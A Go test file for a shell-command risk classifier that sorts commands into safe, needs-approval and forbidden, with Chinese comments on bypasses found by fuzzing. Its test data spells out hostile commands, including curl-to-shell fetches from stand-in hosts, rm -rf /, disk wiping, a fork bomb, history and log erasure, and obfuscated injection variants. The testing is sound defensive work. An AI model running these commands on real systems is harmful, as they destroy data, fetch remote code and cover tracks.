package risk

import (
	"runtime"
	"strings"
	"testing"
	"time"
)

func TestClassifyTable(t *testing.T) {
	cases := []struct {
		name  string
		cmd   string
		level Level
		rule  string
	}{
		// 输入校验
		{"empty", "", LevelForbidden, "COMMAND_INVALID"},
		{"too large", strings.Repeat("a", MaxCommandBytes+1), LevelForbidden, "COMMAND_INVALID"},
		{"nul", "ls\x00 -la", LevelForbidden, "COMMAND_INVALID"},
		{"whitespace only", "   \t  ", LevelForbidden, "COMMAND_INVALID"},

		// SAFE_READ / SAFE_SYSTEM_STATUS / SAFE_PIPE / SAFE_FACTS
		{"ls", "ls -la", LevelSafe, "SAFE_READ"},
		{"pwd", "pwd", LevelSafe, "SAFE_READ"},
		{"cat", "cat /etc/hostname", LevelSafe, "SAFE_READ"},
		{"devnull redirect", "ls -la > /dev/null", LevelSafe, "SAFE_READ"},
		{"pipe", "cat /var/log/syslog | grep error | wc -l", LevelSafe, "SAFE_READ"},
		{"systemctl status", "systemctl status nginx", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"journalctl", "journalctl -u nginx --no-pager", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"docker ps", "docker ps -a", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"ip addr", "ip addr show", LevelSafe, "SAFE_SYSTEM_STATUS"},
		{"facts", "uname -a", LevelSafe, "SAFE_FACTS"},

		// 包装器剥离
		{"sudo ls", "sudo -u root ls -la", LevelSafe, "SAFE_READ"},
		{"env ls", "env FOO=bar ls", LevelSafe, "SAFE_READ"},
		{"timeout ls", "timeout 5 ls", LevelSafe, "SAFE_READ"},
		{"nohup ls", "nohup ls", LevelSafe, "SAFE_READ"},
		{"nice ls", "nice -n 10 ls", LevelSafe, "SAFE_READ"},
		{"exec ls", "exec ls", LevelSafe, "SAFE_READ"},

		// RM_PROTECTED / RM_ANY
		{"rm rf root", "rm -rf /", LevelForbidden, "RM_PROTECTED"},
		{"rm fr root", "rm -fr /", LevelForbidden, "RM_PROTECTED"},
		{"rm r f root", "rm -r -f /", LevelForbidden, "RM_PROTECTED"},
		{"bin rm", "/bin/rm -rf /", LevelForbidden, "RM_PROTECTED"},
		{"sudo rm", "sudo rm -rf /", LevelForbidden, "RM_PROTECTED"},
		{"rm glob", "rm -rf /*", LevelForbidden, "RM_PROTECTED"},
		{"rm dotglob", "rm -rf /.*", LevelForbidden, "RM_PROTECTED"},
		{"rm no preserve", "rm -rf --no-preserve-root /", LevelForbidden, "RM_PROTECTED"},
		{"rm home", "rm -rf /home", LevelForbidden, "RM_PROTECTED"},
		{"rm root home", "rm -rf /root", LevelForbidden, "RM_PROTECTED"},
		{"rm tilde", "rm -rf ~", LevelForbidden, "RM_PROTECTED"},
		{"rm home var", "rm -rf ${HOME}", LevelForbidden, "RM_PROTECTED"},
		{"rm etc", "rm -rf /etc", LevelForbidden, "RM_PROTECTED"},
		{"rm usr lib", "rm -rf /usr/lib", LevelForbidden, "RM_PROTECTED"},
		{"rm tmp", "rm -rf /tmp/x", LevelNeedsApproval, "RM_ANY"},
		{"rm cache", "rm -rf /tmp/cache", LevelNeedsApproval, "RM_ANY"},
		{"rm force", "rm -f a.txt", LevelNeedsApproval, "RM_ANY"},
		{"rm plain", "rm a.txt", LevelNeedsApproval, "DEFAULT_ASK"},
		{"rm var", "rm -rf /var/log", LevelForbidden, "RM_PROTECTED"},

		// MKFS / DD / DEVICE_WRITE
		{"mkfs", "mkfs.ext4 /dev/sdb1", LevelForbidden, "MKFS"},
		{"mkfs bare", "mkfs /dev/sdb1", LevelForbidden, "MKFS"},
		{"mkswap", "mkswap /dev/sdb2", LevelForbidden, "MKFS"},
		{"wipefs", "wipefs -a /dev/sda", LevelForbidden, "MKFS"},
		{"fdisk", "fdisk /dev/sda", LevelForbidden, "MKFS"},
		{"parted", "parted /dev/sda mklabel gpt", LevelForbidden, "MKFS"},
		{"dd device", "dd if=/dev/zero of=/dev/sda bs=1M", LevelForbidden, "DD_DEVICE"},
		{"dd nvme", "dd if=/dev/zero of=/dev/nvme0n1", LevelForbidden, "DD_DEVICE"},
		{"redirect device", "echo x > /dev/sda", LevelForbidden, "DEVICE_WRITE"},
		{"dd file", "dd if=/dev/zero of=/tmp/img bs=1M count=1", LevelNeedsApproval, "FILE_WRITE"},

		// POWER
		{"shutdown", "shutdown -h now", LevelForbidden, "POWER"},
		{"reboot", "reboot", LevelForbidden, "POWER"},
		{"poweroff", "poweroff", LevelForbidden, "POWER"},
		{"halt", "halt", LevelForbidden, "POWER"},
		{"init 0", "init 0", LevelForbidden, "POWER"},
		{"init 6", "init 6", LevelForbidden, "POWER"},
		{"telinit 6", "telinit 6", LevelForbidden, "POWER"},
		{"systemctl reboot", "systemctl reboot", LevelForbidden, "POWER"},

		// 服务
		{"stop sshd", "systemctl stop sshd", LevelForbidden, "CRITICAL_SERVICE_STOP"},
		{"disable networkmanager", "systemctl disable NetworkManager", LevelForbidden, "CRITICAL_SERVICE_STOP"},
		{"mask firewalld", "systemctl mask firewalld", LevelForbidden, "CRITICAL_SERVICE_STOP"},
		{"restart nginx", "systemctl restart nginx", LevelNeedsApproval, "SERVICE_CHANGE"},
		{"enable app", "systemctl enable app.service", LevelNeedsApproval, "SERVICE_CHANGE"},
		{"enable timer", "systemctl enable backup.timer", LevelNeedsApproval, "CRON_CHANGE"},
		{"service stop ssh", "service ssh stop", LevelForbidden, "CRITICAL_SERVICE_STOP"},

		// 防火墙
		{"iptables flush", "iptables -F", LevelForbidden, "FIREWALL_FLUSH"},
		{"iptables X", "iptables -X", LevelForbidden, "FIREWALL_FLUSH"},
		{"iptables add", "iptables -A INPUT -p tcp --dport 22 -j ACCEPT", LevelNeedsApproval, "NETWORK_CHANGE"},
		{"nft flush", "nft flush ruleset", LevelForbidden, "FIREWALL_FLUSH"},
		{"nft add", "nft add rule inet filter input tcp dport 22 accept", LevelNeedsApproval, "NETWORK_CHANGE"},
		{"ufw disable", "ufw disable", LevelForbidden, "FIREWALL_FLUSH"},
		{"ufw allow", "ufw allow 22/tcp", LevelNeedsApproval, "NETWORK_CHANGE"},
		{"ip route add", "ip route add default via 10.0.0.1", LevelNeedsApproval, "NETWORK_CHANGE"},
		{"ip link set", "ip link set eth0 down", LevelNeedsApproval, "NETWORK_CHANGE"},

		// 历史与日志
		{"history -c", "history -c", LevelForbidden, "HISTORY_CLEAR"},
		{"history -d", "history -d 42", LevelForbidden, "HISTORY_CLEAR"},
		{"HISTFILE null", "HISTFILE=/dev/null bash", LevelForbidden, "HISTORY_CLEAR"},
		{"HISTSIZE 0", "HISTSIZE=0", LevelForbidden, "HISTORY_CLEAR"},
		{"unset HISTFILE", "unset HISTFILE", LevelForbidden, "HISTORY_CLEAR"},
		{"set +o history", "set +o history", LevelForbidden, "HISTORY_CLEAR"},
		{"rm bash history", "rm ~/.bash_history", LevelForbidden, "HISTORY_CLEAR"},
		{"truncate history", "truncate -s 0 ~/.zsh_history", LevelForbidden, "HISTORY_CLEAR"},
		{"redirect history", "echo x > ~/.bash_history", LevelForbidden, "HISTORY_CLEAR"},
		{"journalctl vacuum", "journalctl --vacuum-time=1d", LevelForbidden, "LOG_TAMPER"},
		{"journalctl rotate", "journalctl --rotate", LevelForbidden, "LOG_TAMPER"},
		{"truncate log", "truncate -s 0 /var/log/auth.log", LevelForbidden, "LOG_TAMPER"},

		// 进程与权限
		{"kill init", "kill -9 1", LevelForbidden, "KILL_INIT"},
		{"killall systemd", "killall systemd", LevelForbidden, "KILL_INIT"},
		{"pkill sshd", "pkill -9 sshd", LevelForbidden, "KILL_INIT"},
		{"kill proc", "kill -TERM 1234", LevelNeedsApproval, "PROCESS_SIGNAL"},
		{"chmod 777 root", "chmod 777 /", LevelForbidden, "CHMOD_SYSTEM"},
		{"chmod recursive", "chmod -R 755 /etc", LevelForbidden, "CHMOD_SYSTEM"},
		{"chmod var", "chmod -R 777 /var/www", LevelForbidden, "CHMOD_SYSTEM"},
		{"chown recursive", "chown -R www-data /usr/share/nginx", LevelForbidden, "CHMOD_SYSTEM"},
		{"chmod file", "chmod 755 app.sh", LevelNeedsApproval, "PERMISSION_CHANGE"},
		{"setfacl", "setfacl -m u:bob:rw file", LevelNeedsApproval, "PERMISSION_CHANGE"},

		// 包 / 存储 / 账号 / 定时 / 文件
		{"apt install", "apt-get install nginx", LevelNeedsApproval, "PACKAGE_CHANGE"},
		{"apt upgrade", "apt upgrade -y", LevelNeedsApproval, "PACKAGE_CHANGE"},
		{"dnf remove", "dnf remove httpd", LevelNeedsApproval, "PACKAGE_CHANGE"},
		{"pacman", "pacman -Syu", LevelNeedsApproval, "PACKAGE_CHANGE"},
		{"snap", "snap install code", LevelNeedsApproval, "PACKAGE_CHANGE"},
		{"mount", "mount /dev/sdb1 /mnt", LevelNeedsApproval, "STORAGE_CHANGE"},
		{"umount", "umount /mnt", LevelNeedsApproval, "STORAGE_CHANGE"},
		{"lvextend", "lvextend -L +10G /dev/vg/lv", LevelNeedsApproval, "STORAGE_CHANGE"},
		{"useradd", "useradd -m bob", LevelNeedsApproval, "ACCOUNT_CHANGE"},
		{"passwd", "passwd bob", LevelNeedsApproval, "ACCOUNT_CHANGE"},
		{"crontab", "crontab -e", LevelNeedsApproval, "CRON_CHANGE"},
		{"crontab list", "crontab -l", LevelNeedsApproval, "DEFAULT_ASK"},
		{"sed inplace", "sed -i s/a/b/ f.txt", LevelNeedsApproval, "FILE_WRITE"},
		{"tee", "tee /etc/motd", LevelNeedsApproval, "FILE_WRITE"},
		{"redirect etc", "echo hi > /etc/motd", LevelNeedsApproval, "FILE_WRITE"},
		{"mv etc", "mv x /etc/y", LevelNeedsApproval, "FILE_WRITE"},
		{"rsync delete", "rsync --delete a/ b/", LevelNeedsApproval, "FILE_WRITE"},

		// 容器 / 编排
		{"docker run", "docker run -d nginx", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"docker prune", "docker system prune -f", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"compose up", "docker compose up -d", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"kubectl delete", "kubectl delete pod web-1", LevelNeedsApproval, "CONTAINER_CHANGE"},
		{"kubectl apply", "kubectl apply -f app.yaml", LevelNeedsApproval, "CONTAINER_CHANGE"},

		// SQL_WRITE / SQL_DESTRUCTIVE
		{"psql drop", "psql -c 'DROP TABLE t'", LevelForbidden, "SQL_DESTRUCTIVE"},
		{"mysql truncate", `mysql -e 'TRUNCATE TABLE t'`, LevelForbidden, "SQL_DESTRUCTIVE"},
		{"psql delete no where", `psql -c 'DELETE FROM t'`, LevelForbidden, "SQL_DESTRUCTIVE"},
		{"psql update no where", `psql -c 'UPDATE t SET a=1'`, LevelForbidden, "SQL_DESTRUCTIVE"},
		{"psql delete where", `psql -c 'DELETE FROM t WHERE id=1'`, LevelNeedsApproval, "SQL_WRITE"},
		{"psql insert", `psql -c 'INSERT INTO t VALUES (1)'`, LevelNeedsApproval, "SQL_WRITE"},

		// ENV_DUMP / 默认
		{"env", "env", LevelNeedsApproval, "ENV_DUMP"},
		{"printenv", "printenv PATH", LevelNeedsApproval, "ENV_DUMP"},
		{"export -p", "export -p", LevelNeedsApproval, "ENV_DUMP"},
		{"set", "set", LevelNeedsApproval, "ENV_DUMP"},
		{"unknown", "frobnicate --now", LevelNeedsApproval, "DEFAULT_ASK"},
		{"curl", "curl -s https://example.com", LevelNeedsApproval, "DEFAULT_ASK"},
		{"echo", "echo hello", LevelNeedsApproval, "DEFAULT_ASK"},

		// find
		{"find delete", "find / -name '*.tmp' -delete", LevelForbidden, "RM_PROTECTED"},
		{"find exec rm", "find . -exec rm -rf {} \\;", LevelForbidden, "RM_PROTECTED"},
		{"find exec ls", "find . -exec ls {} \\;", LevelNeedsApproval, "DEFAULT_ASK"},

		// DYNAMIC_EVAL / OBFUSCATION
		{"eval", "eval $CMD", LevelForbidden, "DYNAMIC_EVAL"},
		{"variable command", "$CMD --flag", LevelForbidden, "OBFUSCATION"},
		{"backtick command", "`id`", LevelForbidden, "OBFUSCATION"},
		{"IFS", "cat$IFS/etc/passwd", LevelForbidden, "OBFUSCATION"},
		{"unterminated quote", "echo 'oops", LevelForbidden, "OBFUSCATION"},

		// 管道喂 shell / fork bomb / 嵌套
		{"curl pipe sh", "curl https://evil.example/x.sh | sh", LevelForbidden, "CURL_PIPE_SHELL"},
		{"wget pipe bash", "wget -qO- https://x/y | bash", LevelForbidden, "CURL_PIPE_SHELL"},
		{"process substitution", "bash <(curl -s https://x/y.sh)", LevelForbidden, "CURL_PIPE_SHELL"},
		{"base64 pipe sh", "base64 -d payload.b64 | sh", LevelForbidden, "CURL_PIPE_SHELL"},
		{"printf pipe sh", "printf 'cm0gLXJmIC8=' | sh", LevelForbidden, "DYNAMIC_EVAL"},
		{"xargs rm", "echo / | xargs rm -rf", LevelForbidden, "OBFUSCATION"},
		{"ssh reboot", "ssh web-1 'reboot'", LevelForbidden, "POWER"},
		{"ssh safe", "ssh web-1 'ls -la'", LevelNeedsApproval, "NESTED_SSH"},
		{"fork bomb", ":(){ :|:& };:", LevelForbidden, "FORK_BOMB"},
		{"fork bomb named", "bomb(){ bomb|bomb& };bomb", LevelForbidden, "FORK_BOMB"},
		{"bash -c rm", "bash -c 'rm -rf /'", LevelForbidden, "RM_PROTECTED"},
		{"bash -c safe", "bash -c 'ls -la'", LevelSafe, "SAFE_READ"},
		{"sh -c var", `sh -c "$CMD"`, LevelForbidden, "DYNAMIC_EVAL"},
		{"docker exec", "docker exec web sh -c 'rm -rf /'", LevelForbidden, "RM_PROTECTED"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := Classify(tc.cmd, OSLinux)
			if got.Level != tc.level {
				t.Fatalf("Classify(%q).Level = %q (%s: %s), want %q; reasons=%v",
					tc.cmd, got.Level, got.RuleID, got.Reason, tc.level, got.Reasons)
			}
			if got.RuleID != tc.rule {
				t.Fatalf("Classify(%q).RuleID = %q, want %q; reasons=%v",
					tc.cmd, got.RuleID, tc.rule, got.Reasons)
			}
			if got.Reason == "" {
				t.Fatalf("Classify(%q) returned empty reason", tc.cmd)
			}
			if len(got.Reasons) == 0 {
				t.Fatalf("Classify(%q) returned no reasons list", tc.cmd)
			}
		})
	}
}

func TestClassifyNormalization(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"collapse spaces", "ls    -la", "ls -la"},
		{"quoted spaces kept", `echo "a   b"`, `echo "a   b"`},
		{"comment removed", "ls -la # ; rm -rf /", "ls -la"},
		{"continuation", "ls \\\n-la", "ls -la"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := Classify(tc.in, OSLinux)
			if got.Normalized != tc.want {
				t.Fatalf("normalized = %q, want %q", got.Normalized, tc.want)
			}
		})
	}
}

func TestClassifyBypassVariants(t *testing.T) {
	// 换行与分号注入必须按多段处理。
	for _, cmd := range []string{
		"ls\nrm -rf /",
		"ls; rm -rf /",
		"ls && rm -rf /",
		"ls || rm -rf /",
		"ls & rm -rf /",
		"true | rm -rf /",
		"ls |& rm -rf /",
	} {
		if got := Classify(cmd, OSLinux); got.Level != LevelForbidden {
			t.Errorf("Classify(%q) = %q (%s), want forbidden", cmd, got.Level, got.RuleID)
		}
	}

	// 注释中的危险命令不得误报/漏报：注释被切除，整体仍 safe。
	if got := Classify("ls -la # rm -rf /", OSLinux); got.Level != LevelSafe {
		t.Errorf("comment stripped case = %q, want safe", got.Level)
	}

	// 引号中的分隔符不是分段符。
	if got := Classify(`echo "a; rm -rf /"`, OSLinux); got.Level != LevelNeedsApproval {
		t.Errorf("quoted separator = %q (%s), want needs_approval", got.Level, got.RuleID)
	}

	// NFKC：全角字符规范化后仍命中规则。
	if got := Classify("ｒｍ -rf /", OSLinux); got.Level != LevelForbidden {
		t.Errorf("NFKC variant = %q (%s), want forbidden", got.Level, got.RuleID)
	}

	// 深层嵌套（>4 层）失败关闭。
	deep := "bash -c 'bash -c \"bash -c \\'bash -c \\\\\\'ls\\\\\\'\\'\"'"
	if got := Classify(deep, OSLinux); got.Level != LevelForbidden {
		t.Errorf("deep nesting = %q (%s), want forbidden; reasons=%v", got.Level, got.RuleID, got.Reasons)
	}
}

func TestClassifyArithmeticAndRedirectSubstitutions(t *testing.T) {
	// 算术展开 $(( ... )) 内的命令替换会被 shell 执行，必须递归分类。
	for _, cmd := range []string{
		`date $(( $(curl -s http://evil/x.sh | sh) ))`,
		"date $(( `curl -s http://evil/x.sh | sh` ))",
		`ls $(( $(dd if=/dev/zero of=/dev/sda) ))`,
		`date $(( $(shutdown -h now) ))`,
	} {
		if got := Classify(cmd, OSLinux); got.Level != LevelForbidden {
			t.Errorf("Classify(%q) = %q (%s), want forbidden; reasons=%v", cmd, got.Level, got.RuleID, got.Reasons)
		}
	}

	// here-string / 输入重定向的目标同样会被展开，必须收集其中的替换。
	for _, cmd := range []string{
		`cat <<< "$(rm -rf /)"`,
		`cat < "$(rm -rf /)"`,
		`cat 0< "$(rm -rf /)"`,
		"cat <<< \"`rm -rf /`\"",
	} {
		if got := Classify(cmd, OSLinux); got.Level != LevelForbidden {
			t.Errorf("Classify(%q) = %q (%s), want forbidden; reasons=%v", cmd, got.Level, got.RuleID, got.Reasons)
		}
	}

	// 无替换的 here-string / 算术展开仍是只读命令。
	for _, cmd := range []string{`cat <<< "hello"`, `ls $((1+2))`} {
		if got := Classify(cmd, OSLinux); got.Level != LevelSafe {
			t.Errorf("Classify(%q) = %q (%s), want safe", cmd, got.Level, got.RuleID)
		}
	}
}

// TestClassifySubstitutionNeverSafe 锁定 fuzz 不变式 2 的通用兜底：主命令
// 与替换内容双双只读时曾漏判 safe（fuzz 实测 minimize 出 "sh -c ps `ps`"，
// systemctl status 路径同洞）——任何含命令替换的段必须至少 needs_approval。
func TestClassifySubstitutionNeverSafe(t *testing.T) {
	for _, cmd := range []string{
		"sh -c ps `ps`",         // fuzz 崩溃样本（testdata/fuzz/FuzzClassify/0a71fba13d62283c）
		"systemctl status `ps`", // 主命令 SAFE_SYSTEM_STATUS 路径同洞
		"sh -c 'ps' `uptime`",   // 脚本词干净、位置参数携带替换
		"sh -c 'ps `ps`'",       // 替换藏在 -c 脚本内部（递归层兜底）
		"journalctl -n `cat x`", // 其他判 safe 的只读主命令
		"uptime `ps`",           // safeReadCommands 已有兜底，回归确认不回退
		"free `cat /etc/hostname`",
	} {
		got := Classify(cmd, OSLinux)
		if got.Level != LevelNeedsApproval {
			t.Errorf("Classify(%q) = %q (%s), want needs_approval; reasons=%v", cmd, got.Level, got.RuleID, got.Reasons)
		}
	}

	// 纯算术 / 无替换形态不得被收紧误伤，保持 safe。
	for _, cmd := range []string{`ls $((1+2))`, `cat <<< "hello"`, "systemctl status nginx", "sh -c 'uptime'"} {
		got := Classify(cmd, OSLinux)
		if got.Level != LevelSafe {
			t.Errorf("Classify(%q) = %q (%s), want safe (over-tightened)", cmd, got.Level, got.RuleID)
		}
	}
}

// TestClassifyPathInvocationNeverSafe 锁定路径调用拦截（评审 verified high）：
// basename 判定曾使可写目录（/tmp、/dev/shm、$HOME、~）下预放置的二进制
// 冒充只读命令判 safe，在 auto_exec_enabled 服务器上经免审通道执行。
// 任何带目录前缀 / ~ / $HOME 的命令词一律至少 needs_approval；
// basename 仍送规则表，路径形式的危险命令照常 forbidden（不削弱）。
func TestClassifyPathInvocationNeverSafe(t *testing.T) {
	// 评审实测的 7 条漏判形态 + 同族变体：全部不得 safe。
	for _, cmd := range []string{
		"/tmp/ls -la",
		"$HOME/ls -la",
		"~/ls",
		"/dev/shm/ls /etc",
		"ls; /tmp/ls -la",
		"/tmp/systemctl status sshd",
		"env /tmp/ls",
		"./ls",
		"/usr/bin/systemctl status nginx",
		"/bin/bash -c 'ls'",
		"sudo ~/cat /etc/shadow",
	} {
		got := Classify(cmd, OSLinux)
		if !IsAtLeast(got.Level, LevelNeedsApproval) {
			t.Errorf("Classify(%q) = %q (%s), want at least needs_approval", cmd, got.Level, got.RuleID)
		}
	}

	// 路径形式的危险命令必须保持 forbidden（不得因路径拦截而挡住危险检测）。
	for _, cmd := range []string{
		"/bin/rm -rf /",
		"sudo /tmp/rm -rf /",
		"/tmp/mkfs.ext4 /dev/sdb1",
		"~/dd if=/dev/zero of=/dev/sda",
	} {
		got := Classify(cmd, OSLinux)
		if got.Level != LevelForbidden {
			t.Errorf("Classify(%q) = %q (%s), want forbidden", cmd, got.Level, got.RuleID)
		}
	}

	// 裸命令名（PATH 查找语义）不受误伤，保持既有分级。
	for _, cmd := range []string{"ls -la", "cat /etc/os-release", "systemctl status nginx"} {
		got := Classify(cmd, OSLinux)
		if got.Level != LevelSafe {
			t.Errorf("Classify(%q) = %q (%s), want safe (over-tightened)", cmd, got.Level, got.RuleID)
		}
	}
}

func TestClassifySafeReadArgumentBypass(t *testing.T) {
	cases := []string{
		`date -s 2020-01-01`,
		`sudo date -s 2020-01-01`,
		`date 010100002020`,
		`hostname evil`,
		`sudo hostname evil`,
		`hostname -F /etc/hostname`,
		`ss -K dst 1.2.3.4`,
		`ss -Ktn state established`,
		`sudo ss --kill dst 1.2.3.4`,
	}
	for _, cmd := range cases {
		got := Classify(cmd, OSLinux)
		if got.Level != LevelNeedsApproval {
			t.Errorf("Classify(%q) = %q (%s), want needs_approval", cmd, got.Level, got.RuleID)
		}
	}

	for _, cmd := range []string{`date`, `date -u +%s`, `hostname`, `hostname -f`, `ss -tn`} {
		got := Classify(cmd, OSLinux)
		if got.Level != LevelSafe {
			t.Errorf("Classify(%q) = %q (%s), want safe", cmd, got.Level, got.RuleID)
		}
	}
}

// TestClassifyMemoryGuard 锁定内存红线：上一轮 fuzz 实测 risk.test 单进程
// 涨到 12.9GB 并两次触发系统 OOM。根因是 parseCommand 用 w.text += string(b)
// 逐字节拼接单词（O(n²) 分配，16KB 词即 ~256MB），以及 normalize 的 NFKC
// 膨胀缺上限。修复后分类器对任何 ≤16KB 输入的总分配必须保持在 MB 级以下；
// 展开类形态（NFKC 规范化是唯一的"展开结果"产生点）已有 ≤64KB 的硬上限
// （MaxCommandBytes=16384，超出即失败关闭）。
func TestClassifyMemoryGuard(t *testing.T) {
	cases := map[string]string{
		// O(n²) 引爆形态：长单词（修复前 16KB 词分配 ~256MB）。
		"long-word":   "cat " + strings.Repeat("a", 16000),
		"long-quoted": `cat "` + strings.Repeat("a", 15000) + `"`,
		"long-escape": strings.Repeat(`\x`, 8000),
		// NFKC 膨胀：U+FDFA 单字符展开 18 字节，超出 MaxCommandBytes 必须失败关闭。
		"nfkc-fdfa":      strings.Repeat("﷽", 1000),
		"nfkc-fullwidth": strings.Repeat("ｒｍ", 8000),
		// 短输入 + 名义巨量展开（brace / printf 宽度）：分类器不做展开模拟，
		// 不允许出现输入驱动的展开分配。
		"brace-expand": "echo {1..2147483647}",
		"printf-width": "printf '%*s' 2147483647 x",
		// 嵌套替换 / 反引号 / 分段轰炸：递归收集不得放大。
		"nested-subst":   "$(" + strings.Repeat("a$(", 80) + "id" + strings.Repeat(")", 80) + ")",
		"backtick-storm": strings.Repeat("`id`;", 1000),
		"many-segments":  strings.Repeat("ls;", 8000),
		"glob-rm":        "rm -rf /" + strings.Repeat("*?", 100),
	}
	const budget = 8 << 20 // 8MB：线性处理 16KB 输入 + NFKC 膨胀余量
	for name, cmd := range cases {
		var before, after runtime.MemStats
		runtime.GC()
		runtime.ReadMemStats(&before)
		Classify(cmd, OSLinux)
		runtime.ReadMemStats(&after)
		if grew := after.TotalAlloc - before.TotalAlloc; grew > budget {
			t.Errorf("%s (%d bytes input) allocated %d bytes, budget %d", name, len(cmd), grew, budget)
		}
	}
}

// TestClassifyNoHang 锁定挂起回归：readRedirectTarget 零消费返回曾使
// parseCommand 的游标不前进，7 字节输入 "&>>>0.." 即可把分类器挂死在
// 纯 CPU 死循环里（fuzz 实测 worker 卡死、宿主进程被 OOM 杀死）。
// 这些微型重定向轰炸输入必须在毫秒级完成分类。
func TestClassifyNoHang(t *testing.T) {
	inputs := []string{
		"&>>>0..", "&>&", "0&>", ">>>", "0&>.", "a&>b>>c", ">>&",
		"&>", "&>>", "&>>>", ">>&>&", ">&", "> > > >", ">&|", "&>|",
		"&>&&", "&>&>", "<&<&", "0&>&1", "&>>>0..\xae\x9e",
	}
	for _, cmd := range inputs {
		done := make(chan Decision, 1)
		go func(c string) { done <- Classify(c, OSLinux) }(cmd)
		select {
		case d := <-done:
			if d.Level == "" || d.RuleID == "" {
				t.Errorf("Classify(%q) incomplete decision: %+v", cmd, d)
			}
		case <-time.After(5 * time.Second):
			t.Fatalf("Classify(%q) hung for over 5s", cmd)
		}
	}
}

// TestAmpersandRedirectNotLost 锁定 &> 重定向的漏检修复：parseRedirectOp
// 从 '&' 起解析会丢弃操作符，"&> /etc/passwd" 被当作输入重定向漏过
// FILE_WRITE；修复后 &>/&>> 必须按输出重定向分类。
func TestAmpersandRedirectNotLost(t *testing.T) {
	for _, cmd := range []string{"evil &> /etc/passwd", "evil &>> /var/log/x"} {
		got := Classify(cmd, OSLinux)
		if !IsAtLeast(got.Level, LevelNeedsApproval) {
			t.Errorf("Classify(%q) = %q (%s), want >= needs_approval", cmd, got.Level, got.RuleID)
		}
	}
}

// TestArithmeticEmptySubstitutionNotSafe 锁定 fuzz 发现的绕过：$(($(())))
// 的内层 $(()) 是 bash 空命令替换（实际会 fork），旧判定把它静默当作纯
// 算术忽略，导致含替换的命令漏判 safe。空体必须按命令替换收集。
func TestArithmeticEmptySubstitutionNotSafe(t *testing.T) {
	for _, cmd := range []string{
		`ls $(($(())))`, `ls $(())`, `ls $(($(())))x`, `echo $(($(())))`,
	} {
		if got := Classify(cmd, OSLinux); got.Level == LevelSafe {
			t.Errorf("Classify(%q) = safe, want >= needs_approval", cmd)
		}
	}
	// 对照：纯算术与无替换 here-string 保持只读。
	for _, cmd := range []string{`ls $((1+2))`, `ls $(( (1+2)*3 ))`, `cat <<< "hello"`} {
		if got := Classify(cmd, OSLinux); got.Level != LevelSafe {
			t.Errorf("Classify(%q) = %q (%s), want safe", cmd, got.Level, got.RuleID)
		}
	}
}

// TestFuzzFoundBypasses 固化本轮 fuzz 发现并修复的全部绕过形态；
// 修复原则是失败关闭（无法静态证明安全 → 至少 needs_approval），
// 未放宽任何安全语义。
func TestFuzzFoundBypasses(t *testing.T) {
	notSafe := []string{
		// 算术展开伪装：空体/非法体回退为命令替换（bash 实测会执行）。
		`ls $(($(())))`, `ls $(())`, `ls $(()$((0)))`, `ls $((<()))`,
		`ls $((<((0))))`, `ls $(( ( ) ))`,
		// 替换在无命令词上下文仍被求值执行。
		"<`id`>", `A=` + "`pwd`" + ``, "'' `id`",
		// fd 复用目标藏危险词（bash 歧义重定向错误，失败关闭）。
		"cat<&rm -rf", "cat <&rm",
	}
	for _, cmd := range notSafe {
		if got := Classify(cmd, OSLinux); got.Level == LevelSafe {
			t.Errorf("Classify(%q) = safe, want >= needs_approval", cmd)
		}
	}
	// 对照：合法算术与合法 fd 复制保持只读。
	safeCases := []string{
		`ls $((1+2))`, `ls $(( (1+2)*3 ))`, `ls $((0<((0))))`, `ls $((16#ff))`,
		`ls $(($x))`, `ls $(( $((0)) ))`, `ls $(( ))`, "cat <&0",
	}
	for _, cmd := range safeCases {
		if got := Classify(cmd, OSLinux); got.Level != LevelSafe {
			t.Errorf("Classify(%q) = %q (%s), want safe; reasons=%v", cmd, got.Level, got.RuleID, got.Reasons)
		}
	}
}

func TestIsAtLeast(t *testing.T) {
	if !IsAtLeast(LevelForbidden, LevelNeedsApproval) {
		t.Fatal("forbidden should be at least needs_approval")
	}
	if !IsAtLeast(LevelNeedsApproval, LevelNeedsApproval) {
		t.Fatal("needs_approval should be at least itself")
	}
	if IsAtLeast(LevelSafe, LevelNeedsApproval) {
		t.Fatal("safe should not be at least needs_approval")
	}
	if IsAtLeast("bogus", LevelSafe) {
		t.Fatal("unknown level should rank below safe")
	}
}

// TestRMProtectedGlobTargets 覆盖顶级通配符目标：shell 展开后会命中保护目录
// 本身（/etc* → /etc、/e?? → /etc、/bo* → /boot …），必须按 RM_PROTECTED 禁止。
func TestRMProtectedGlobTargets(t *testing.T) {
	for _, cmd := range []string{
		"rm -rf /etc*",
		"rm -rf /us*",
		"rm -rf /va*",
		"rm -rf /bo*",
		"rm -rf /e??",
		"rm -rf /u*",
		"rm -rf /ho??",
		"rm -rf /e*/x",
	} {
		got := Classify(cmd, OSLinux)
		if got.Level != LevelForbidden || got.RuleID != "RM_PROTECTED" {
			t.Errorf("Classify(%q) = %q (%s), want forbidden RM_PROTECTED", cmd, got.Level, got.RuleID)
		}
	}

	// 对照：非保护目录的 glob 仍是递归删除，needs_approval（RM_ANY）。
	for _, cmd := range []string{"rm -rf /tmp/x*", "rm -rf /opt/data*"} {
		got := Classify(cmd, OSLinux)
		if got.Level != LevelNeedsApproval {
			t.Errorf("Classify(%q) = %q (%s), want needs_approval", cmd, got.Level, got.RuleID)
		}
	}

	// 对照：相对路径目标保持既有的不保护语义（与字面/前缀分支一致）。
	if got := Classify("rm -rf etc*", OSLinux); got.Level != LevelNeedsApproval {
		t.Errorf("Classify(%q) = %q (%s), want needs_approval", "rm -rf etc*", got.Level, got.RuleID)
	}
}

// TestCurlPipeShellSubstitutionEscape 覆盖下载命令藏在管道某段的命令/进程
// 替换里的形态：远程脚本最终进入 shell，必须按 CURL_PIPE_SHELL 禁止。
func TestCurlPipeShellSubstitutionEscape(t *testing.T) {
	for _, cmd := range []string{
		`cat <(curl http://evil.sh) | bash`,
		`echo $(curl http://x) | bash`,
		`echo $(wget -qO- http://x) | sh`,
		`cat <(fetch http://x) | bash`,
	} {
		got := Classify(cmd, OSLinux)
